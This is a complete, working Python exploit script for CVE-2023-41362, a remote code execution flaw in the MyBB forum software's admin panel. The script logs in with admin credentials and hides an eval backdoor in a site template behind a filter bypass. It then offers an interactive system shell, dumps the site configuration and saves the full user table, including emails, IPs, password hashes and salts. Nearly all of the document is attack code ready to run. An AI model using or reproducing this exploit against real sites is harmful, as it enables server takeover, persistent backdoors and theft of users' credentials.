#!/usr/bin/python3
# Exploit script for CVE-2023-41362
# https://blog.sorcery.ie/posts/mybb_acp_rce/
import requests
import html
import argparse
import logging
from base64 import b64encode

class CustomFormatter(logging.Formatter):
	yellow = "\x1b[33;20m"
	red = "\x1b[31;20m"
	bold_red = "\x1b[31;1m"
	reset = "\x1b[0m"
	format = "%(levelname)s: %(message)s"

	FORMATS = {
		logging.DEBUG: format,
		logging.INFO: "[*] %(message)s",
		logging.WARNING: yellow + format + reset,
		logging.ERROR: red + format + reset,
		logging.CRITICAL: bold_red + format + reset
	}

	def format(self, record):
		log_fmt = self.FORMATS.get(record.levelno)
		formatter = logging.Formatter(log_fmt)
		return formatter.format(record)

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
ch = logging.StreamHandler()
ch.setFormatter(CustomFormatter())
logger.addHandler(ch)

def get_postkey(text):
	return text.split('my_post_key" value="')[1].split('"')[0]

def send_php(php_code):
	return session.get(f"{target}/online.php",cookies={'1':b64encode(php_code.encode()).decode()}).text

def remove():
	logger.info("Removing payload from template")
	rm_payload = '$db->query("UPDATE {$db->table_prefix}templates SET template=SUBSTRING_INDEX(template,\'}-->\',-1) WHERE template LIKE \'%[0][0][0][0]%\'");'
	send_php(rm_payload)
	logger.warning("Payload removed")
	exit()

def dump_config():
	dump_config_payload = 'print_r($config);'
	print(send_php(dump_config_payload))

def dump_users():
	users_payload = '$q=$db->query("SELECT CONCAT_WS(\',\',uid,username,email,hex(regip),hex(lastip),password,salt) as x FROM {$db->table_prefix}users");while($r=$db->fetch_array($q)){print($r[\'x\'].PHP_EOL);}die();'
	logger.info(f"Saving user table to {domain}.txt")
	with open(f"{domain}.txt",'w') as f:
		f.write(send_php(users_payload))
	logger.info(f"Complete")

def shell():
	logger.info("Testing code exec...")
	page = send_php('echo "lmao";')
	if 'lmao' in page:
		logger.info("Shell is working")
	else:
		logger.warning("Shell doesnt seem to work correctly")
	logger.info("Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)")
	while True:
		command = input("Enter Command> ")
		if command in ['exit','quit']:
			break
		if command == 'remove':
			remove()
			continue
		if command == 'config':
			dump_config()
			continue
		if command == 'dump':
			dump_users()
			continue
		command = command.replace("'","\\'")
		page = send_php(f"system('{command}');")
		print(page)

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="MyBB CVE-2023-41362 Exploit Script")
	parser.add_argument("target", help="Target URL (e.g., https://example.com)")
	parser.add_argument("username", help="Admin username")
	parser.add_argument("password", help="Admin password")
	parser.add_argument("--admincp", default="admin", help="Admin control panel path")
	parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36", help="User Agent")
	args = parser.parse_args()
	target = args.target.rstrip("/")
	domain = args.target.split('://')[1].split('/')[0]
	admincp_path = args.admincp

	# login to admin
	session = requests.Session()
	session.headers.update({"User-Agent":args.user_agent})

	logger.info(f"Logging into {target}/{admincp_path}/ as {args.username}")
	login = session.post(f"{target}/{admincp_path}/index.php", data={"username":args.username, "password":args.password, "do":"login"})
	if '<p id="message" class="error">' in login.text:
		logger.error("Login Failed")
		exit()
	if 'This account has been locked out' in login.text:
		logger.error("Account has been locked out for failing login too many times")
		exit()

	# we should have admin panel access now
	page = session.get(f"{target}/{admincp_path}/index.php?module=style-templates&action=edit_template&title=online&sid=1").text
	postkey = get_postkey(page)
	existing_template = html.unescape(page.split('<textarea name="template" class="" id="template" style="width: 100%; height: 500px;" rows="5" cols="45">')[1].split('</textarea>')[0])
	tid = page.split('tid" value="')[1].split('"')[0]
	# using html comment to hide the insert_id() response of 0
	# payload uses a lot of [0]'s to trigger catastrophic regex backtracking to bypass filter
	payload = "<!--{$db->insert_id(isset($_COOKIE[1])?die(eval(base64_decode($_COOKIE[1]))):'')}{$a"+("[0]"*2000)+"}-->"
	if '[0][0][0][0][0]' in existing_template:
		logger.warning('Template already contains our payload code? Skipping to sending commands...')
	else:
		page = session.post(f"{target}/{admincp_path}/index.php?module=style-templates&action=edit_template",data={'my_post_key':postkey, 'tid':tid,'title':'online','sid':1,'template':f"{payload}{existing_template}","continue":"Save and Continue Editing"})
		if "The selected template has successfully been saved." in page.text:
			logger.info("Template saved!")
		else:
			logger.error("Template failed to save")
	shell()
